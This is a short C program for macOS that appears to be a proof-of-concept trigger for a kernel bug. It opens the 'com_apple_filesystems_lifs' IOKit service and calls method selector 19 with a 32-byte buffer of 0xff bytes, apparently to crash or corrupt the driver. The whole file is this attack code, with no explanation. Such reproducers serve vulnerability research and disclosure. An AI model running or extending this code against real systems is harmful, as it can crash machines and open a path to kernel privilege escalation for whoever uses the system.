#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <IOKit/IOKitLib.h>

int main(){
    io_connect_t client;
    int sz = 0x20;
    void *mem = malloc(sz);
    memset(mem, 0xff, sz);
    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("com_apple_filesystems_lifs"));
    IOServiceOpen(service, mach_task_self(), 0, &client);
    IOConnectCallMethod(client, 19, 0, 0, mem, sz, 0, 0, 0, 0);
}
